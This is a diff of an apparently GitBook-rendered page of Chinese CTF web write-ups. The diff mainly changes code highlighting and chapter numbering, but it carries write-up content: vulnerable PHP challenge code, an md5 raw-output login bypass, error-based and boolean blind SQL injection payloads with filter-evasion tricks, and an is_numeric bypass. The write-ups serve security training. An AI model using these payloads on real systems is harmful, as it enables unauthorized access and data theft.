@@ -29,7 +29,7 @@
                 
             
                 
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-prism/prism.css">
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                 
             
                 
@@ -353,7 +353,20 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="1.5.1" data-path="2019national.html">
+        <li class="chapter " data-level="1.5.1" data-path="2018ddctf.html">
+            
+                <a href="2018ddctf.html">
+            
+                    
+                    2018DDCTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="2019national.html">
             
                 <a href="2019national.html">
             
@@ -366,7 +379,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.5.2" data-path="2019ddctf.html">
+        <li class="chapter " data-level="1.5.3" data-path="2019ddctf.html">
             
                 <a href="2019ddctf.html">
             
@@ -379,7 +392,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.5.3" data-path="2017national.html">
+        <li class="chapter " data-level="1.5.4" data-path="2017national.html">
             
                 <a href="2017national.html">
             
@@ -392,7 +405,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.5.4" data-path="xihulunjian2019.html">
+        <li class="chapter " data-level="1.5.5" data-path="xihulunjian2019.html">
             
                 <a href="xihulunjian2019.html">
             
@@ -405,7 +418,7 @@
             
         </li>
     
-        <li class="chapter active" data-level="1.5.5" data-path="shiyanbar_web.html">
+        <li class="chapter active" data-level="1.5.6" data-path="shiyanbar_web.html">
             
                 <a href="shiyanbar_web.html">
             
@@ -541,7 +554,7 @@
 <p>F12&#x67E5;&#x770B;&#x54CD;&#x5E94;&#x5934;&#xFF0C;&#x53D1;&#x73B0;&#x8FD4;&#x56DE;tips<br>     <a href="https://i.loli.net/2019/04/08/5cab35507b9c4.png" rel="grouped" title="" target="_blank" class="fancybox">
        <img src="https://i.loli.net/2019/04/08/5cab35507b9c4.png" alt="">
      </a><br>&#x8BBF;&#x95EE;test.php&#x6587;&#x4EF6;&#x5F97;&#x5230;&#x6E90;&#x4EE3;&#x7801;&#xFF1A;</p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
+<pre><code>&lt;?php
 define(&quot;SECRET_KEY&quot;, &apos;***********&apos;);
 define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);
 error_reporting(0);
@@ -616,7 +629,7 @@ if(isset($_POST[&apos;id&apos;])){
                 &lt;/div&gt;
             &lt;/body&gt;&apos;;
     }
-}?&gt;</span>
+}?&gt;
 </code></pre><p>&#x4EE3;&#x7801;&#x5206;&#x6790;&#xFF1A;  </p>
 <ul>
 <li>sqliCheck&#x51FD;&#x6570;&#x8D1F;&#x8D23;&#x8FC7;&#x6EE4;sql&#x6CE8;&#x5165;</li>
@@ -626,7 +639,7 @@ if(isset($_POST[&apos;id&apos;])){
 <h3 id="0x02-&#x540E;&#x53F0;&#x767B;&#x5F55;"><a name="0x02-&#x540E;&#x53F0;&#x767B;&#x5F55;" class="anchor-navigation-ex-anchor" href="#0x02-&#x540E;&#x53F0;&#x767B;&#x5F55;"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.2. 0x02 &#x540E;&#x53F0;&#x767B;&#x5F55;</h3>
 <h4 id="&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;_1"><a name="&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;_1" class="anchor-navigation-ex-anchor" href="#&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;_1"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;" class="plugin-anchor" href="#&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;</h4>
 <ul>
-<li>&#x8003;&#x70B9;&#xFF1A;md5()&#x51FD;&#x6570;16&#x4F4D;&#x4E8C;&#x8FDB;&#x5236;&#x683C;&#x5F0F;&#x7ED5;&#x8FC7;&#xFF0C;<code>md5(&quot;ffifdyop&quot;,True)</code>&#x5F97;&#x5230;&#x7684;&#x52A0;&#x5BC6;&#x5B57;&#x7B26;&#x4E32;&#x4E3A;<code>&apos;or&apos;6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>crash</span><span class="token punctuation">&gt;</span></span></code>(&#x6CE8;&#xFF1A;<code>or &apos;&#x6570;&#x5B57;+&#x5B57;&#x6BCD;&apos;</code> &#x7B49;&#x4EF7;&#x4E8E;<code>or true</code>)  </li>
+<li>&#x8003;&#x70B9;&#xFF1A;md5()&#x51FD;&#x6570;16&#x4F4D;&#x4E8C;&#x8FDB;&#x5236;&#x683C;&#x5F0F;&#x7ED5;&#x8FC7;&#xFF0C;<code>md5(&quot;ffifdyop&quot;,True)</code>&#x5F97;&#x5230;&#x7684;&#x52A0;&#x5BC6;&#x5B57;&#x7B26;&#x4E32;&#x4E3A;<code>&apos;or&apos;6&lt;crash&gt;</code>(&#x6CE8;&#xFF1A;<code>or &apos;&#x6570;&#x5B57;+&#x5B57;&#x6BCD;&apos;</code> &#x7B49;&#x4EF7;&#x4E8E;<code>or true</code>)  </li>
 <li>&#x96BE;&#x5EA6;&#xFF1A;&#x6613;  </li>
 <li>WP&#xFF1A;<a href="https://blog.csdn.net/qq_36791003/article/details/81746730" target="_blank">https://blog.csdn.net/qq_36791003/article/details/81746730</a>  </li>
 </ul>
@@ -634,7 +647,7 @@ if(isset($_POST[&apos;id&apos;])){
 <p>&#x6253;&#x5F00;&#x7F51;&#x9875;&#xFF0C;&#x53F3;&#x952E;&#x67E5;&#x770B;&#x6E90;&#x4EE3;&#x7801;&#x53D1;&#x73B0;&#x6E90;&#x7801;&#xFF1A;<br>     <a href="https://i.loli.net/2019/04/08/5cab35767dac4.png" rel="grouped" title="" target="_blank" class="fancybox">
        <img src="https://i.loli.net/2019/04/08/5cab35767dac4.png" alt="">
      </a>  </p>
-<pre class="language-"><code><span class="token comment">&lt;!-- $password=$_POST[&apos;password&apos;];
+<pre><code>&lt;!-- $password=$_POST[&apos;password&apos;];
 $sql = &quot;SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&quot;.md5($password,true).&quot;&apos;&quot;;
 $result=mysqli_query($link,$sql);
     if(mysqli_num_rows($result)&gt;0){
@@ -642,8 +655,8 @@ $result=mysqli_query($link,$sql);
     }
     else{
         echo &apos;&#x5BC6;&#x7801;&#x9519;&#x8BEF;!&apos;;
-    } --&gt;</span>
-</code></pre><p>&#x4E0A;&#x7F51;&#x67E5;&#x4E86;&#x4E0B;&#xFF0C;&#x4E86;&#x89E3;&#x5230;md5($password,true)&#x8FD4;&#x56DE;&#x7684;&#x662F;<strong>&#x539F;&#x59CB; 16 &#x5B57;&#x7B26;&#x4E8C;&#x8FDB;&#x5236;&#x683C;&#x5F0F;</strong>&#x7684;&#x5BC6;&#x6587;,&#x8FD4;&#x56DE;&#x7684;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x5B58;&#x5728;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x6545;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x627E;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x4F7F;&#x5176;md5(str,true)&#x52A0;&#x5BC6;&#x8FC7;&#x8FD4;&#x56DE;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x4E0E;&#x539F;sql&#x8BED;&#x53E5;&#x62FC;&#x63A5;&#x9020;&#x6210;SQL&#x6CE8;&#x5165;&#x653B;&#x51FB;&#x3002;<br>&#x7ECF;&#x8FC7;&#x7B80;&#x5355;&#x7684;Fuzz,&#x6211;&#x4EEC;&#x77E5;&#x9053;&#xFF1A;&#x5B57;&#x7B26;&#x4E32;<code>&apos;or&apos;6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>&#x4E71;&#x7801;</span><span class="token punctuation">&gt;</span></span>&quot;</code>&#xFF0C;&#x6B64;&#x65F6;&#x5982;&#x679C;&#x62FC;&#x63A5;&#x5230;sql&#x8BED;&#x53E5;&#x4E2D;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x6761;&#x8BED;&#x53E5;&#x5C06;&#x4F1A;&#x53D8;&#x6210;&#x4E00;&#x6761;&#x6C38;&#x771F;&#x5F0F;&#xFF0C;&#x56E0;&#x6B64;&#x6210;&#x529F;&#x767B;&#x5F55;&#xFF0C;&#x83B7;&#x5F97;flag&#x3002;<br>     <a href="https://i.loli.net/2019/04/08/5cab35767372d.png" rel="grouped" title="" target="_blank" class="fancybox">
+    } --&gt;
+</code></pre><p>&#x4E0A;&#x7F51;&#x67E5;&#x4E86;&#x4E0B;&#xFF0C;&#x4E86;&#x89E3;&#x5230;md5($password,true)&#x8FD4;&#x56DE;&#x7684;&#x662F;<strong>&#x539F;&#x59CB; 16 &#x5B57;&#x7B26;&#x4E8C;&#x8FDB;&#x5236;&#x683C;&#x5F0F;</strong>&#x7684;&#x5BC6;&#x6587;,&#x8FD4;&#x56DE;&#x7684;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x5B58;&#x5728;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x6545;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x627E;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x4F7F;&#x5176;md5(str,true)&#x52A0;&#x5BC6;&#x8FC7;&#x8FD4;&#x56DE;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x4E0E;&#x539F;sql&#x8BED;&#x53E5;&#x62FC;&#x63A5;&#x9020;&#x6210;SQL&#x6CE8;&#x5165;&#x653B;&#x51FB;&#x3002;<br>&#x7ECF;&#x8FC7;&#x7B80;&#x5355;&#x7684;Fuzz,&#x6211;&#x4EEC;&#x77E5;&#x9053;&#xFF1A;&#x5B57;&#x7B26;&#x4E32;<code>&apos;or&apos;6&lt;&#x4E71;&#x7801;&gt;&quot;</code>&#xFF0C;&#x6B64;&#x65F6;&#x5982;&#x679C;&#x62FC;&#x63A5;&#x5230;sql&#x8BED;&#x53E5;&#x4E2D;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x6761;&#x8BED;&#x53E5;&#x5C06;&#x4F1A;&#x53D8;&#x6210;&#x4E00;&#x6761;&#x6C38;&#x771F;&#x5F0F;&#xFF0C;&#x56E0;&#x6B64;&#x6210;&#x529F;&#x767B;&#x5F55;&#xFF0C;&#x83B7;&#x5F97;flag&#x3002;<br>     <a href="https://i.loli.net/2019/04/08/5cab35767372d.png" rel="grouped" title="" target="_blank" class="fancybox">
        <img src="https://i.loli.net/2019/04/08/5cab35767372d.png" alt="">
      </a>  </p>
 <h3 id="0x03-&#x52A0;&#x4E86;&#x6599;&#x7684;&#x62A5;&#x9519;&#x6CE8;&#x5165;"><a name="0x03-&#x52A0;&#x4E86;&#x6599;&#x7684;&#x62A5;&#x9519;&#x6CE8;&#x5165;" class="anchor-navigation-ex-anchor" href="#0x03-&#x52A0;&#x4E86;&#x6599;&#x7684;&#x62A5;&#x9519;&#x6CE8;&#x5165;"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.3. 0x03 &#x52A0;&#x4E86;&#x6599;&#x7684;&#x62A5;&#x9519;&#x6CE8;&#x5165;</h3>
@@ -660,12 +673,12 @@ $result=mysqli_query($link,$sql);
 <p>&#x89C2;&#x5BDF;&#x9898;&#x76EE;&#x53EF;&#x77E5;&#x6B64;&#x9898;&#x8003;&#x7684;&#x662F;&#x62A5;&#x9519;&#x6CE8;&#x5165;&#xFF0C;&#x53F3;&#x952E;&#x6E90;&#x4EE3;&#x7801;&#x5F97;&#x5230;&#x63D0;&#x5347;&#xFF1A;Post&#x53D1;&#x9001;username&amp;password&#x3002;<br>     <a href="https://i.loli.net/2019/04/08/5cab35769ace0.png" rel="grouped" title="" target="_blank" class="fancybox">
        <img src="https://i.loli.net/2019/04/08/5cab35769ace0.png" alt="">
      </a><br>sql&#x8BED;&#x53E5;&#x5982;&#x4E0B;&#xFF1A;</p>
-<pre class="language-"><code>$sql=&quot;select * from users where username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;
+<pre><code>$sql=&quot;select * from users where username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;
 </code></pre><p>&#x6CE8;&#x610F;&#xFF1A;&#x6B64;&#x5904;&#x53EF;&#x63A7;&#x7684;&#x53C2;&#x6570;&#x6709;&#x4E24;&#x4E2A;&#x3002;<br>&#x7B80;&#x5355;&#x624B;&#x5DE5;&#x6D4B;&#x8BD5;&#xFF0C;&#x53D1;&#x73B0;&#x8FC7;&#x6EE4;&#x4E86;<code>#&#xFF0C;and</code>&#x7B49;&#x5173;&#x952E;&#x5B57;&#xFF0C;&#x800C;&#x4E14;username&#x5904;&#x5355;&#x72EC;&#x8FC7;&#x6EE4;&#x4E86;&#x53F3;&#x62EC;&#x53F7;&#xFF0C;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x6211;&#x4EEC;&#x65E0;&#x6CD5;&#x518D;username&#x51FA;&#x4F7F;&#x7528;&#x51FD;&#x6570;&#xFF0C;&#x56E0;&#x800C;&#x6211;&#x4EEC;&#x5C06;&#x76EE;&#x5149;&#x8F6C;&#x5411;password&#x3002;<br>     <a href="https://i.loli.net/2019/04/08/5cab357692922.png" rel="grouped" title="" target="_blank" class="fancybox">
        <img src="https://i.loli.net/2019/04/08/5cab357692922.png" alt="">
      </a><br>&#x7ECF;&#x8FC7;&#x4E00;&#x756A;&#x4EBA;&#x5DE5;Fuzz&#xFF0C;&#x53D1;&#x73B0;&#x53EA;&#x6709;exp()&#x51FD;&#x6570;&#x6CA1;&#x6709;&#x88AB;&#x8FC7;&#x6EE4;&#xFF0C;&#x6545;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x8BED;&#x53E5;&#xFF1A;<code>exp(~(select * from(select user())a))</code>&#x6210;&#x529F;&#x7206;&#x51FA;&#x7528;&#x6237;&#x540D;&#x3002;
 &#x6700;&#x7EC8;&#x6211;&#x4EEC;&#x7684;payload&#x5982;&#x4E0B;&#xFF1A;</p>
-<pre class="language-"><code>username=a&apos;/*&amp;password=*/Or exp(~(select * from(select database())a))or&apos;1 
+<pre><code>username=a&apos;/*&amp;password=*/Or exp(~(select * from(select database())a))or&apos;1 
 //&#x67E5;&#x8BE2;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;
 username=a&apos;/*&amp;password=*/Or exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema regexp &apos;error_based_hpf&apos;)a))or&apos;1 
 //&#x67E5;&#x8BE2;&#x8868;&#x540D;&#xFF0C;&#x6B64;&#x5904;&#x7531;&#x4E8E;=&#x88AB;&#x8FC7;&#x6EE4;&#xFF0C;&#x6211;&#x4EEC;&#x4F7F;&#x7528;regexp&#x6765;&#x7ED5;&#x8FC7;
@@ -684,17 +697,17 @@ username=a&apos;/*&amp;password=*/Or exp(~(select * from(select group_concat(val
 <p>&#x6253;&#x5F00;&#x7F51;&#x9875;&#xFF0C;&#x968F;&#x4FBF;&#x8F93;&#x5165;&#x4E2A;&#x6570;&#x5B57;&#xFF0C;&#x9875;&#x9762;&#x8FD4;&#x56DE;<code>You are in...</code>&#xFF0C;&#x8F93;&#x5165;&#x5728;&#x6570;&#x5B57;&#x540E;&#x52A0;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x8FD4;&#x56DE;<code>You are not in...</code>&#x3002;<br>     <a href="https://i.loli.net/2019/04/08/5cab407181198.png" rel="grouped" title="" target="_blank" class="fancybox">
        <img src="https://i.loli.net/2019/04/08/5cab407181198.png" alt="">
      </a><br>&#x731C;&#x6D4B;&#x6B64;&#x5904;&#x8003;&#x7684;&#x662F;bool&#x76F2;&#x6CE8;&#xFF0C;&#x6839;&#x636E;&#x9875;&#x9762;&#x8FD4;&#x56DE;&#x7684;&#x5185;&#x5BB9;&#x5224;&#x65AD;&#x771F;&#x5047;&#x3002;<br>&#x7ECF;&#x8FC7;&#x4E00;&#x756A;&#x7B80;&#x5355;&#x7684;fuzz&#xFF0C;&#x53D1;&#x73B0;&#x6B64;&#x5904;&#x8FC7;&#x6EE4;&#x7684;&#x51FD;&#x6570;&#x53EA;&#x4F1A;&#x8FC7;&#x6EE4;&#x4E00;&#x6B21;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C06;&#x8FC7;&#x6EE4;&#x5173;&#x952E;&#x8BCD;&#x53CC;&#x5199;&#xFF1A;<code>oorr</code>&#x5C31;&#x597D;&#x4E86;&#x3002;  </p>
-<pre class="language-"><code>id=aaa&apos;oorr(1=1)=&apos;1  //&#x8FD4;&#x56DE;You are in
+<pre><code>id=aaa&apos;oorr(1=1)=&apos;1  //&#x8FD4;&#x56DE;You are in
 id=aaa&apos;oorr(1=2)=&apos;1  //&#x8FD4;&#x56DE;You are not in
 // &#x6B64;&#x5904;&#x7684;aaa&#x662F;&#x4E3A;&#x4E86;&#x8BA9;&#x524D;&#x8FB9;&#x6761;&#x4EF6;&#x4E3A;&#x5047;&#xFF0C;&#x90A3;&#x4E48;sql&#x8BED;&#x53E5;&#x7684;&#x5224;&#x65AD;&#x5C06;&#x4F9D;&#x8D56;&#x4E8E;&#x540E;&#x8FB9;&#x7684;&#x8BED;&#x53E5;
 // &#x5373;&#xFF1A;false &#x222A; (&#x6761;&#x4EF6;&#x4E00;) = &#x6761;&#x4EF6;&#x4E00;
 </code></pre><p>&#x6211;&#x4EEC;&#x5148;&#x5224;&#x65AD;&#x6570;&#x636E;&#x5E93;&#x957F;&#x5EA6;&#xFF1A;</p>
-<pre class="language-"><code>id=aaa&apos;oorr(length(database())&gt;1)=&apos;1
+<pre><code>id=aaa&apos;oorr(length(database())&gt;1)=&apos;1
 </code></pre><p>&#x5176;&#x6B21;&#x5FAA;&#x73AF;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x540D;&#x8FDB;&#x884C;&#x5224;&#x65AD;&#xFF1A;</p>
-<pre class="language-"><code>id=aaa&apos;oorr(mid((select+database())from(1)foorr(1))=&apos;c&apos;)=&apos;1 
+<pre><code>id=aaa&apos;oorr(mid((select+database())from(1)foorr(1))=&apos;c&apos;)=&apos;1 
 //&#x7531;&#x4E8E;,&#x88AB;&#x8FC7;&#x6EE4;&#xFF0C;&#x4F7F;&#x7528;from&#x4E0E;for&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF0C;&#x8BB0;&#x5F97;for&#x8981;&#x5199;&#x6210;foorr&#x7ED5;&#x8FC7;&#x8FC7;&#x6EE4;&#xFF0C;+&#x53F7;&#x7ED5;&#x8FC7;&#x7A7A;&#x683C;&#x8FC7;&#x6EE4;
 </code></pre><p>&#x63A5;&#x7740;&#x5FAA;&#x73AF;&#x5224;&#x65AD;&#x8868;&#x540D;&#xFF1A;</p>
-<pre class="language-"><code>id=aaa&apos;oorr(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))from(1)foorr(1))=&apos;a&apos;)=&apos;1
+<pre><code>id=aaa&apos;oorr(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))from(1)foorr(1))=&apos;a&apos;)=&apos;1
 </code></pre><p>&#x4E4B;&#x540E;&#x5C31;&#x4E0D;&#x5199;&#x4E86;&#xFF0C;&#x4E0E;&#x4E0A;&#x8FB9;&#x7C7B;&#x4F3C;&#xFF0C;&#x5199;&#x811A;&#x672C;&#x8DD1;&#x5C31;&#x597D;&#x3002;  </p>
 <h3 id="0x05-&#x4F60;&#x771F;&#x7684;&#x4F1A;php&#x5417;&#xFF1F;"><a name="0x05-&#x4F60;&#x771F;&#x7684;&#x4F1A;php&#x5417;&#xFF1F;" class="anchor-navigation-ex-anchor" href="#0x05-&#x4F60;&#x771F;&#x7684;&#x4F1A;php&#x5417;&#xFF1F;"><i class="fa fa-link" aria-hidden="true"></i></a>4.2.5. 0x05 &#x4F60;&#x771F;&#x7684;&#x4F1A;PHP&#x5417;&#xFF1F;</h3>
 <h4 id="&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;_4"><a name="&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;_4" class="anchor-navigation-ex-anchor" href="#&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;_4"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;" class="plugin-anchor" href="#&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x7B80;&#x5355;&#x6982;&#x62EC;&#xFF1A;</h4>
@@ -707,7 +720,7 @@ id=aaa&apos;oorr(1=2)=&apos;1  //&#x8FD4;&#x56DE;You are not in
 <p>&#x6253;&#x5F00;&#x9898;&#x76EE;&#xFF0C;&#x53D1;&#x73B0;&#x8FD4;&#x56DE;&#x5934;&#x5B58;&#x5728;&#x63D0;&#x793A;&#x4FE1;&#x606F;&#xFF1A;<br>     <a href="https://i.loli.net/2019/04/09/5cac89ded0e73.png" rel="grouped" title="" target="_blank" class="fancybox">
        <img src="https://i.loli.net/2019/04/09/5cac89ded0e73.png" alt="">
      </a><br>&#x6253;&#x5F00;&#x94FE;&#x63A5;&#x83B7;&#x5F97;&#x6E90;&#x7801;&#xFF1A;  </p>
-<pre class="language-"><code><span class="token prolog">&lt;?php
+<pre><code>&lt;?php
 $info = &quot;&quot;; 
 $req = [];
 $flag=&quot;xxxxxxxxxx&quot;;
@@ -755,7 +768,7 @@ if(is_numeric($_REQUEST[&apos;number&apos;])){
      }
 }
 echo $info;
-?&gt;</span>
+?&gt;
 </code></pre><p>&#x4EE3;&#x7801;&#x6D41;&#x7A0B;&#xFF1A;<br><code>is_numeric[false] &amp;&amp; $req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;]))[false]</code><br>-&gt; <code>$value1!=$value2[false]</code><br>-&gt; <code>is_palindrome_number($req[&quot;number&quot;])[true]</code>  </p>
 <p><strong>&#x6211;&#x4EEC;&#x77E5;&#x9053;is_numeric&#x51FD;&#x6570;&#x4E0E;ereg&#x51FD;&#x6570;&#x4E00;&#x6837;&#xFF0C;&#x5B58;&#x5728;&#x622A;&#x65AD;&#x6F0F;&#x6D1E;&#xFF0C;&#x800C;&#x7B2C;&#x4E8C;&#x4E2A;if&#x5224;&#x65AD;&#x5B58;&#x5728;&#x5F31;&#x7C7B;&#x578B;&#x6BD4;&#x8F83;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x8FD9;&#x4E24;&#x4E2A;&#x6F0F;&#x6D1E;&#x7EC4;&#x5408;&#x8D77;&#x6765;&#x6253;&#x4E00;&#x5957;&#x7EC4;&#x5408;&#x62F3;&#x3002;</strong><br>PHP&#x8BED;&#x8A00;&#x5BF9;&#x4E8E;32&#x4F4D;&#x7CFB;&#x7EDF;&#x7684;int&#x53D8;&#x91CF;&#x6765;&#x8BF4;&#xFF0C;&#x6700;&#x5927;&#x503C;&#x662F;2147483647&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;&#x6570;&#x503C;&#x4E3A;2147483647&#x7684;&#x8BDD;&#xFF0C;&#x7ECF;&#x8FC7;strrev&#x51FD;&#x6570;&#x53CD;&#x8F6C;&#x518D;&#x8F6C;&#x6210;int&#x51FD;&#x6570;&#x4ECD;&#x662F;2147483647&#xFF0C;&#x56E0;&#x4E3A;746384741&gt;2147483647&#xFF0C;&#x8F6C;&#x6210;int&#x53D8;&#x91CF;&#x4F1A;&#x51CF;&#x5C0F;&#x6210;2147483647&#xFF0C;&#x6545;&#x800C;&#x7ED5;&#x8FC7;&#x770B;&#x4F3C;&#x77DB;&#x76FE;&#x7684;&#x6761;&#x4EF6;&#x3002;<br>&#x800C;&#x5BF9;&#x4E8E;&#x5F00;&#x59CB;&#x7684;is_numeric&#xFF0C;&#x52A0;&#x4E0A;%00&#x6216;%20&#x5373;&#x53EF;&#xFF0C;&#x6B64;&#x65F6;is_numeric&#x51FD;&#x6570;&#x4FBF;&#x4E0D;&#x4F1A;&#x8BA4;&#x4E3A;&#x8FD9;&#x662F;&#x4E2A;&#x6570;&#x5B57;&#xFF0C;&#x800C;&#x5BF9;&#x4E8E;&#x4E0B;&#x8FB9;&#x7684;strval()in&#x3001;intval()&#x5374;&#x65E0;&#x5F71;&#x54CD;&#x3002;<br>&#x7EFC;&#x4E0A;&#x6240;&#x8FF0;&#xFF0C;&#x6211;&#x4EEC;&#x7684;number&#x5E94;&#x4E3A;&#xFF1A;2147483647%00&#x3001;2147483647%20&#x3001;%002147483647&#x3002;</p>
 <blockquote>
@@ -797,16 +810,16 @@ echo $info;
 </ul>
 <h4 id="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_7"><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_7" class="anchor-navigation-ex-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;_7"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;" class="plugin-anchor" href="#&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x89E3;&#x9898;&#x8FC7;&#x7A0B;&#xFF1A;</h4>
 <p>&#x53F3;&#x952E;&#x6E90;&#x4EE3;&#x7801;&#x5F97;&#x5230;&#x63D0;&#x793A;&#x4FE1;&#x606F;<code>source.txt</code>&#xFF0C;&#x6253;&#x5F00;&#x5F97;&#x5230;&#x6E90;&#x7801;&#x3002;  </p>
-<pre class="language-"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>?php</span>
-<span class="token attr-name">error_reporting(0);</span>
+<pre><code>&lt;?php
+error_reporting(0);
 
-<span class="token attr-name">if</span> <span class="token attr-name">(!isset($_POST[&apos;uname&apos;])</span> <span class="token attr-name">||</span> <span class="token attr-name">!isset($_POST[&apos;pwd&apos;]))</span> <span class="token attr-name">{</span>
-    <span class="token attr-name">echo</span> <span class="token attr-name">&apos;&lt;form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>&apos;.&quot;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span>&quot;;
-    echo &apos;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>uname<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>&apos;.&quot;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span>&quot;;
-    echo &apos;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>pwd<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>&apos;.&quot;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span>&quot;;
-    echo &apos;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>&apos;.&quot;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span>&quot;;
-    echo &apos;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>&apos;.&quot;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span>&quot;;
-    echo &apos;<span class="token comment">&lt;!--source: source.txt--&gt;</span>&apos;.&quot;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span>&quot;;
+if (!isset($_POST[&apos;uname&apos;]) || !isset($_POST[&apos;pwd&apos;])) {
+    echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;.&quot;&lt;br/&gt;&quot;;
+    echo &apos;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;
+    echo &apos;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;
+    echo &apos;&lt;input type=&quot;submit&quot; /&gt;&apos;.&quot;&lt;br/&gt;&quot;;
+    echo &apos;&lt;/form&gt;&apos;.&quot;&lt;br/&gt;&quot;;
+    echo &apos;&lt;!--source: source.txt--&gt;&apos;.&quot;&lt;br/&gt;&quot;;
     die;
 }
 
@@ -872,7 +885,7 @@ mysql_close($con);
 </ul>
